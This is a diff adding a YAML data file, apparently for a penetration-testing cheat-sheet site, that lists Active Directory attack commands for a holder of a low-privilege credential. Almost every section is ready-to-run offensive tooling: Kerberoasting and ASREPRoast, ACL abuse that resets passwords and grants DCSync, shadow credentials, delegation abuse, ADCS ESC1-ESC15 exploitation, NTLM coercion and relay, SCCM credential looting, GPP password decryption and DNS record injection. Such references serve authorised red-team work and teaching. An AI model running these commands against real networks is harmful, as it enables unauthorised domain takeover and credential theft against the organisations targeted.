@@ -1,0 +1,397 @@
+tab: user
+title: Valid user
+order: 20
+blurb: >
+  You hold a valid low-priv credential ($USER / $PASS or -H $NTHASH). Enumerate deeply,
+  map attack paths in BloodHound, then roast / abuse ACLs / hit ADCS toward higher privilege.
+
+sections:
+
+  - name: Authenticated enumeration
+    hint: Now that you can bind, pull everything.
+    steps:
+      - text: Users, groups, policy, shares (nxc)
+        cmds:
+          - "nxc smb $RHOST -u $USER -p $PASS --users --groups --pass-pol"
+          - "nxc smb $RHOST -u $USER -p $PASS --shares"
+          - "nxc ldap $RHOST -u $USER -p $PASS --users"
+          - {c: "nxc ldap $RHOST -u $USER -p $PASS -M maq", lbl: "machine account quota (RBCD prereq)"}
+          - {c: "nxc ldap $RHOST -u $USER -p $PASS -M adcs", lbl: "quick ADCS presence check"}
+          - {c: "crackmapexec smb $RHOST -u $USER -p $PASS --users", lbl: "CME (deprecated)"}
+      - text: Dump the whole directory to HTML/JSON
+        cmds:
+          - "ldapdomaindump -u '$DOMAIN\\$USER' -p '$PASS' $RHOST"
+      - text: LDAP enumeration
+        cmds:
+          - {c: "windapsearch.py -d $DOMAIN --dc-ip $RHOST -u $USER -p $PASS -U", lbl: "users"}
+          - {c: "windapsearch.py -d $DOMAIN --dc-ip $RHOST -u $USER -p $PASS -G", lbl: "groups"}
+          - {c: "windapsearch.py -d $DOMAIN --dc-ip $RHOST -u $USER -p $PASS -C", lbl: "computers"}
+          - {c: "windapsearch.py -d $DOMAIN --dc-ip $RHOST -u $USER -p $PASS --da", lbl: "domain admins"}
+          - {c: "windapsearch.py -d $DOMAIN --dc-ip $RHOST -u $USER -p $PASS -PU", lbl: "privileged users"}
+          - "ldapsearch -x -H ldap://$RHOST -D '$USER@$DOMAIN' -w '$PASS' -b 'DC=<corp>,DC=<local>'"
+      - text: AD-integrated DNS dump
+        cmds:
+          - "adidnsdump -u '$DOMAIN\\$USER' -p '$PASS' $RHOST"
+          - {c: "adidnsdump -u '$DOMAIN\\$USER' -p '$PASS' -r $RHOST", lbl: "resolve unknown records"}
+
+  - name: Bulk recon / audit tooling
+    hint: Auto-enum tools that dump broad state. Loud — use when stealth is not the goal.
+    steps:
+      - text: PowerView (in-domain, PowerShell)
+        flags: [win]
+        cmds:
+          - {c: "Import-Module .\\PowerView.ps1", lbl: "load"}
+          - "Get-NetUser | select samaccountname,description"
+          - "Get-NetGroup 'Domain Admins' -Recurse"
+          - "Get-NetComputer -Ping | select name,operatingsystem"
+          - {c: "Find-LocalAdminAccess", lbl: "where am I local admin"}
+          - "Invoke-UserHunter"
+      - text: SharpView — compiled PowerView
+        flags: [win]
+        cmds:
+          - {c: ".\\SharpView.exe Get-NetUser", lbl: "same functions as PowerView.ps1"}
+      - text: PingCastle — health / attack-path score
+        cmds:
+          - "PingCastle.exe --healthcheck --server $DOMAIN"
+      - text: Group3r — GPO misconfig hunting
+        cmds:
+          - "group3r -f group3r.log"
+          - {c: "group3r -f group3r.log -u '$DOMAIN\\$USER'", lbl: "check perms as this user"}
+      - text: ADRecon — full domain report to Excel
+        flags: [win]
+        cmds:
+          - ".\\ADRecon.ps1 -Method LDAP -DomainController $RHOST -Credential $DOMAIN\\$USER"
+          - {c: ".\\ADRecon.ps1 -GenExcel C:\\ADRecon-Report-<ts>", lbl: "build report from CSVs"}
+      - text: LAPSToolkit — find & read LAPS
+        flags: [win]
+        cmds:
+          - "Find-LAPSDelegatedGroups"
+          - {c: "Find-AdmPwdExtendedRights", lbl: "who can read LAPS"}
+          - "Get-LAPSPasswords"
+          - {c: "nxc ldap $RHOST -u $USER -p $PASS -M laps", lbl: "LAPS via netexec"}
+
+  - name: BloodHound — collect & analyse
+    hint: Community Edition collectors. Upload the zip, run 'Shortest paths to Domain Admins'.
+    steps:
+      - text: Install BloodHound CE
+        cmds:
+          - "curl -L https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz | tar -xz"
+          - {c: "./bloodhound-cli install", lbl: "spins up BHCE in Docker, prints admin creds"}
+          - "# UI at http://localhost:8080"
+      - text: Collect remotely (Python, CE)
+        cmds:
+          - "bloodhound-ce-python -d $DOMAIN -u $USER -p '$PASS' -ns $RHOST -c all --zip"
+          - {c: "bloodhound-python -d $DOMAIN -u $USER -p '$PASS' -ns $RHOST -c all --zip", lbl: "legacy BH 4.x"}
+          - "nxc ldap $RHOST -u $USER -p '$PASS' --bloodhound --collection All --dns-server $RHOST"
+      - text: Collect on a domain host (SharpHound)
+        flags: [win]
+        cmds:
+          - {c: ".\\SharpHound.exe -c All --zipfilename bh.zip", lbl: "drop the zip, upload in UI"}
+          - "Invoke-BloodHound -CollectionMethod All -ZipFileName bh.zip"
+      - text: Faster / stealthier collectors
+        cmds:
+          - {c: "rusthound-ce -d $DOMAIN -u '$USER@$DOMAIN' -p '$PASS' -o bh_out -z", lbl: "RustHound (CE)"}
+          - {c: ".\\SOAPHound.exe -c cache.txt --bhdump -o bh_out", lbl: "SOAPHound (ADWS, low-noise)"}
+
+  - name: Kerberoasting
+    hint: Service accounts with SPNs — request their TGS and crack offline. Needs any valid user.
+    steps:
+      - text: Request TGS hashes
+        cmds:
+          - "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $RHOST -request"
+          - {c: "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $RHOST -request -outputfile tgs.hash", lbl: "to file"}
+          - "nxc ldap $RHOST -u $USER -p $PASS --kerberoasting kerb.out"
+      - text: Rubeus (on a domain host)
+        flags: [win]
+        cmds:
+          - ".\\Rubeus.exe kerberoast /outfile:tgs.hash"
+          - {c: ".\\Rubeus.exe kerberoast /stats", lbl: "list roastable + stats first"}
+      - text: Enumerate SPNs (setspn)
+        flags: [win]
+        cmds:
+          - "setspn -T $DOMAIN -Q */*"
+          - {c: "setspn -L <account>", lbl: "SPNs of one account"}
+      - text: Targeted / blind Kerberoast (via write access)
+        cmds:
+          - {c: "targetedKerberoast.py -d $DOMAIN -u $USER -p '$PASS' --dc-ip $RHOST", lbl: "set SPN, roast, unset"}
+      - text: Crack
+        cmds:
+          - "hashcat -m 13100 tgs.hash $PASSLIST"
+
+  - name: ASREPRoast (authenticated)
+    hint: With creds you can list roastable users first, then request.
+    steps:
+      - text: List & request
+        cmds:
+          - "impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $RHOST -format hashcat"
+          - "nxc ldap $RHOST -u $USER -p $PASS --asreproast asrep.out"
+      - text: Crack
+        cmds:
+          - "hashcat -m 18200 asrep.hash $PASSLIST"
+
+  - name: ACL / ACE abuse
+    hint: Act on the edges BloodHound finds — GenericAll, WriteDACL, WriteOwner, ForceChangePassword.
+    steps:
+      - text: What can I write? (bloodyAD)
+        cmds:
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST get writable"
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST get children 'DC=<corp>,DC=<local>'"
+      - text: GenericAll / ForceChangePassword → reset a password
+        cmds:
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST set password $TARGET 'NewP@ss1'"
+          - {c: "net rpc password $TARGET 'NewP@ss1' -U $DOMAIN/$USER%$PASS -S $RHOST", lbl: "via rpc"}
+      - text: Add self to a group
+        cmds:
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST add groupMember '<group>' $USER"
+      - text: WriteOwner → take ownership → grant rights
+        cmds:
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST set owner $TARGET $USER"
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST add genericAll $TARGET $USER"
+      - text: WriteDACL on the domain → grant yourself DCSync
+        flags: [admin]
+        cmds:
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST add dcsync $USER"
+
+  - name: Shadow Credentials
+    hint: GenericWrite/GenericAll over a target's msDS-KeyCredentialLink → auth as them via PKINIT.
+    steps:
+      - text: Add a key credential (pywhisker)
+        cmds:
+          - "pywhisker.py -d $DOMAIN -u $USER -p '$PASS' --target $TARGET --action add"
+          - "certipy shadow auto -u $USER@$DOMAIN -p '$PASS' -account $TARGET"
+      - text: Use the cert → TGT / NT hash
+        cmds:
+          - "gettgtpkinit.py $DOMAIN/$TARGET -cert-pfx $TARGET.pfx -pfx-pass '' $TARGET.ccache -dc-ip $RHOST"
+          - "KRB5CCNAME=$TARGET.ccache getnthash.py $DOMAIN/$TARGET -key '<as-rep-key>'"
+
+  - name: Read GMSA / LAPS
+    hint: Managed passwords you may be entitled to read.
+    steps:
+      - text: ReadGMSAPassword
+        cmds:
+          - "nxc ldap $RHOST -u $USER -p $PASS --gmsa"
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST get object '<gmsa$>' --attr msDS-ManagedPassword"
+      - text: Read LAPS
+        cmds:
+          - "nxc ldap $RHOST -u $USER -p $PASS -M laps"
+
+  - name: Kerberos delegation
+    hint: Enumerate delegation, then abuse unconstrained / constrained / RBCD.
+    steps:
+      - text: Find delegation
+        cmds:
+          - "impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $RHOST"
+          - "nxc ldap $RHOST -u $USER -p $PASS --trusted-for-delegation"
+          - {c: "ldapsearch -x -H ldap://$RHOST -D '$USER@$DOMAIN' -w '$PASS' -b 'DC=<corp>,DC=<local>' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName", lbl: "unconstrained (UAC bit)"}
+          - {c: "ldapsearch -x -H ldap://$RHOST -D '$USER@$DOMAIN' -w '$PASS' -b 'DC=<corp>,DC=<local>' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo", lbl: "constrained targets"}
+      - text: Constrained delegation (S4U)
+        cmds:
+          - "impacket-getST -spn cifs/$TARGET -impersonate administrator $DOMAIN/$USER:$PASS -dc-ip $RHOST"
+      - text: RBCD — you can write msDS-AllowedToActOnBehalfOfOtherIdentity
+        cmds:
+          - {c: "impacket-addcomputer $DOMAIN/$USER:$PASS -computer-name 'ATTACK$' -computer-pass 'Passw0rd!' -dc-ip $RHOST", lbl: "add a computer you control"}
+          - "rbcd.py -delegate-from 'ATTACK$' -delegate-to '$TARGET' -action write $DOMAIN/$USER:$PASS -dc-ip $RHOST"
+          - "impacket-getST -spn cifs/$TARGET -impersonate administrator -dc-ip $RHOST 'ATTACK$':'Passw0rd!'"
+
+  - name: ADCS — enumerate & abuse (ESC1-ESC15)
+    hint: certipy finds it; each ESC has its own abuse path. Certify.exe is the Windows equivalent.
+    steps:
+      - text: Enumerate CAs, templates, PKI objects
+        cmds:
+          - "certipy find -u $USER@$DOMAIN -p '$PASS' -dc-ip $RHOST -vulnerable -stdout"
+          - {c: "certipy find -u $USER@$DOMAIN -p '$PASS' -dc-ip $RHOST -old-bloodhound", lbl: "feed into BloodHound"}
+          - {c: ".\\Certify.exe find /vulnerable", lbl: "Windows (GhostPack)"}
+      - text: "ESC1 — template allows enrollee-supplied SAN"
+        flags: [cve]
+        cmds:
+          - "certipy req -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -template '$TEMPLATE' -upn administrator@$DOMAIN -target <ca_server>"
+          - "certipy auth -pfx administrator.pfx -dc-ip $RHOST"
+      - text: "ESC2 — Any Purpose EKU / SubCA template"
+        flags: [cve]
+        cmds:
+          - "certipy req -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -template '$TEMPLATE' -target <ca_server>"
+          - "# Any-Purpose cert -> use it to auth or chain into ESC3"
+      - text: "ESC3 — Enrollment Agent template"
+        flags: [cve]
+        cmds:
+          - "certipy req -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -template '$TEMPLATE' -target <ca_server>"
+          - "certipy req -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -template User -on-behalf-of '$DOMAIN\\administrator' -pfx agent.pfx -target <ca_server>"
+      - text: "ESC4 — write access over a template (rewrite it to ESC1)"
+        flags: [cve]
+        cmds:
+          - "certipy template -u $USER@$DOMAIN -p '$PASS' -template '$TEMPLATE' -save-old -target <ca_server>"
+          - "# now abuse as ESC1; restore later with -configuration <saved.json>"
+      - text: "ESC5 — vulnerable ACL on a PKI object (CA/host/templates container)"
+        flags: [cve]
+        cmds:
+          - "# write the PKI object via bloodyAD/dacledit, then enrol as ESC1/ESC4"
+      - text: "ESC6 — CA sets EDITF_ATTRIBUTESUBJECTALTNAME2"
+        flags: [cve]
+        cmds:
+          - "certipy req -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -template User -upn administrator@$DOMAIN -target <ca_server>"
+      - text: "ESC7 — you hold ManageCA / ManageCertificates"
+        flags: [cve]
+        cmds:
+          - "certipy ca -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -add-officer $USER -target <ca_server>"
+          - "certipy ca -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -enable-template SubCA -target <ca_server>"
+      - text: "ESC8 — relay NTLM to CA web enrollment"
+        flags: [cve, opsec]
+        cmds:
+          - "certipy relay -target 'http://<ca_server>' -template DomainController"
+          - {c: "ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController", lbl: "impacket relay"}
+      - text: "ESC9 — no security extension (szOID_NTDS_CA_SECURITY_EXT)"
+        flags: [cve]
+        cmds:
+          - "certipy account update -u $USER@$DOMAIN -p '$PASS' -user $TARGET -upn administrator@$DOMAIN"
+          - "certipy req -u $TARGET@$DOMAIN -p '<pass>' -ca '$CA' -template '$TEMPLATE' -target <ca_server>"
+      - text: "ESC10 — weak certificate mapping on the DC"
+        flags: [cve]
+        cmds:
+          - "certipy account update -u $USER@$DOMAIN -p '$PASS' -user $TARGET -upn 'administrator@$DOMAIN'"
+          - "certipy req -u $TARGET@$DOMAIN -p '<pass>' -ca '$CA' -template User -target <ca_server>"
+      - text: "ESC11 — relay to CA RPC (ICPR, no packet signing)"
+        flags: [cve, opsec]
+        cmds:
+          - "certipy relay -target 'rpc://<ca_server>' -ca '$CA' -template DomainController"
+      - text: "ESC13 — template with an issuance policy linked to a privileged group"
+        flags: [cve]
+        cmds:
+          - "certipy req -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -template '$TEMPLATE' -target <ca_server>"
+      - text: "ESC14 — write on altSecurityIdentities (explicit cert mapping)"
+        flags: [cve]
+        cmds:
+          - "# set altSecurityIdentities on the target, then auth with a matching cert"
+      - text: "ESC15 — v1 template + application policies (EKUwu, CVE-2024-49019)"
+        flags: [cve]
+        cmds:
+          - "certipy req -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -template '$TEMPLATE' -application-policies 'Client Authentication' -upn administrator@$DOMAIN -target <ca_server>"
+      - text: "Pass-the-Certificate — auth with a .pfx/.crt"
+        cmds:
+          - "certipy auth -pfx administrator.pfx -dc-ip $RHOST"
+          - {c: "passthecert.py -action ldap-shell -crt user.crt -key user.key -domain $DOMAIN -dc-ip $RHOST", lbl: "LDAP shell over Schannel"}
+      - text: "Masky — pull NT hash via the CA (agent cert)"
+        cmds:
+          - "masky -d $DOMAIN -u $USER -p '$PASS' -ca '<ca_server>\\$CA' $RHOST"
+
+  - name: MSSQL from the domain
+    hint: SQL logins often map to AD; trusted links and xp_cmdshell lead to exec.
+    steps:
+      - text: Connect & enumerate
+        cmds:
+          - "impacket-mssqlclient $DOMAIN/$USER:$PASS@$RHOST -windows-auth"
+          - "nxc mssql $RHOST -u $USER -p $PASS --local-auth"
+      - text: Exec / links (in mssqlclient)
+        cmds:
+          - {c: "enable_xp_cmdshell", lbl: "then: xp_cmdshell whoami"}
+          - {c: "enum_links", lbl: "trusted SQL links"}
+      - text: PowerUpSQL (discovery + audit, PowerShell)
+        flags: [win]
+        cmds:
+          - "Get-SQLInstanceDomain"
+          - {c: "Invoke-SQLAudit -Verbose -Instance <sqlserver>", lbl: "find escalation"}
+          - {c: "Get-SQLServerLinkCrawl -Instance <sqlserver> -Query 'exec master..xp_cmdshell whoami'", lbl: "crawl links to exec"}
+
+  - name: Coercion → relay
+    hint: Force a privileged machine to authenticate to you, then relay or capture it.
+    steps:
+      - text: Find the coercion surface first
+        cmds:
+          - {c: "nxc smb <cidr> -u $USER -p $PASS -M spooler", lbl: "MS-RPRN (printerbug)"}
+          - {c: "nxc smb <cidr> -u $USER -p $PASS -M webdav", lbl: "WebClient running (HTTP coerce)"}
+          - {c: "nxc smb <cidr> -u $USER -p $PASS -M coerce_plus", lbl: "all coercion methods at once"}
+      - text: Coercer — try every coercion method at once
+        flags: [opsec]
+        cmds:
+          - "coercer coerce -u $USER -p '$PASS' -d $DOMAIN -l $LHOST -t $TARGET"
+          - {c: "coercer scan -u $USER -p '$PASS' -d $DOMAIN -t $TARGET", lbl: "enumerate exposed methods"}
+      - text: PetitPotam (MS-EFSRPC)
+        flags: [cve]
+        cmds:
+          - "petitpotam.py -u $USER -p '$PASS' -d $DOMAIN $LHOST $TARGET"
+      - text: PrinterBug (MS-RPRN) / DFSCoerce (MS-DFSNM)
+        flags: [cve]
+        cmds:
+          - "printerbug.py $DOMAIN/$USER:$PASS@$TARGET $LHOST"
+          - "dfscoerce.py -u $USER -p '$PASS' -d $DOMAIN $LHOST $TARGET"
+      - text: Plant coercion files on a share (ntlm_theft)
+        cmds:
+          - "ntlm_theft.py -g all -s $LHOST -f loot"
+      - text: Catch it → relay (pair with a listener)
+        flags: [opsec]
+        cmds:
+          - "ntlmrelayx.py -t ldap://$RHOST --escalate-user $USER"
+          - {c: "ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController", lbl: "coerce+relay = ESC8"}
+
+  - name: SCCM / MECM
+    hint: Config Manager is a fast path to secrets and domain-wide exec. Enumerate, loot NAA, take over.
+    steps:
+      - text: Enumerate SCCM
+        cmds:
+          - "nxc ldap $RHOST -u $USER -p $PASS -M sccm"
+          - {c: "sccmhunter.py find -u $USER -p '$PASS' -d $DOMAIN -dc-ip $RHOST", lbl: "Python — discover site systems"}
+          - {c: ".\\SharpSCCM.exe local site-info", lbl: "on a client"}
+          - {c: "SCCMHound.exe --server <sccm_server> --sitecode <sitecode>", lbl: "BloodHound data"}
+      - text: Loot Network Access Account (NAA) creds
+        flags: [win]
+        cmds:
+          - ".\\SharpSCCM.exe local secrets -m wmi"
+          - ".\\SharpSCCM.exe local secrets -m disk"
+      - text: PXE boot media secrets (no creds needed on the DP)
+        flags: [nocreds]
+        cmds:
+          - "pxethief.py 2 <distribution_point_ip>"
+          - "pxethief.py 5 '\\\\<dp>\\SMSTemp\\<boot>.var'"
+      - text: Client push → coerce SCCM auth (takeover)
+        flags: [opsec]
+        cmds:
+          - ".\\SharpSCCM.exe invoke client-push -mp <sccm_server>.$DOMAIN -sc <sitecode> -t $LHOST"
+          - {c: "sccmhunter.py clientpush -u $USER -p '$PASS' -d $DOMAIN -dc-ip $RHOST -sccm <sccm_server>", lbl: "Python equivalent"}
+      - text: Exec on managed devices (with SCCM admin)
+        flags: [admin]
+        cmds:
+          - ".\\SharpSCCM.exe exec -p <binary> -d <device_name>"
+
+  - name: Known authenticated CVEs
+    hint: One valid user + an unpatched DC/host.
+    steps:
+      - text: MS14-068 (PAC forgery, ancient DCs)
+        flags: [cve]
+        cmds:
+          - "ms14-068.py -u $USER@$DOMAIN -p '$PASS' -s <user_sid> -d $RHOST"
+      - text: noPac / ZeroLogon (see No-creds tab)
+        cmds:
+          - "# both usable here too once you hold any valid credential"
+
+  - name: GPP / SYSVOL passwords
+    hint: Group Policy Preferences leaked AES-encrypted passwords into SYSVOL — the key is public.
+    steps:
+      - text: Pull & decrypt GPP cpassword
+        cmds:
+          - "Get-GPPPassword.py $DOMAIN/$USER:$PASS@$RHOST"
+          - {c: "nxc smb $RHOST -u $USER -p $PASS -M gpp_password", lbl: "netexec module"}
+          - {c: "gpp-decrypt <cpassword>", lbl: "decrypt a value by hand"}
+      - text: Hunt SYSVOL / NETLOGON for secrets
+        cmds:
+          - "nxc smb $RHOST -u $USER -p $PASS --spider SYSVOL --pattern txt,xml,bat,ps1,config,ini,inf"
+          - "smbmap -H $RHOST -u $USER -p '$PASS' -R NETLOGON"
+          - {c: "grep -ri cpassword <sysvol_mount>/", lbl: "on a mounted copy"}
+
+  - name: ADIDNS records
+    hint: Any user can usually write AD-integrated DNS — add a record to point WPAD/relay at yourself.
+    steps:
+      - text: Query / add records (dnstool)
+        cmds:
+          - "dnstool.py -u '$DOMAIN\\$USER' -p '$PASS' -r <record> -d $RHOST --action query"
+          - {c: "dnstool.py -u '$DOMAIN\\$USER' -p '$PASS' -r <record> -a add -t A -d $LHOST $RHOST", lbl: "add A record -> your host"}
+
+  - name: Azure AD / Entra recon
+    hint: Hybrid-joined domains leak sync accounts; a foothold here can pivot to the cloud tenant.
+    steps:
+      - text: Spot sync accounts in AD
+        cmds:
+          - {c: "nxc ldap $RHOST -u $USER -p $PASS --users | grep -iE 'msol|sync|azureadssoacc'", lbl: "AAD Connect / SSO accounts"}
+          - "ldapsearch -x -H ldap://$RHOST -D '$USER@$DOMAIN' -w '$PASS' -b 'DC=<corp>,DC=<local>' '(description=*Azure*)' sAMAccountName description"
+      - text: Enumerate the tenant (roadrecon)
+        cmds:
+          - "roadrecon auth -u $USER@$DOMAIN -p '$PASS'"
+          - {c: "roadrecon gather", lbl: "then: roadrecon gui"}
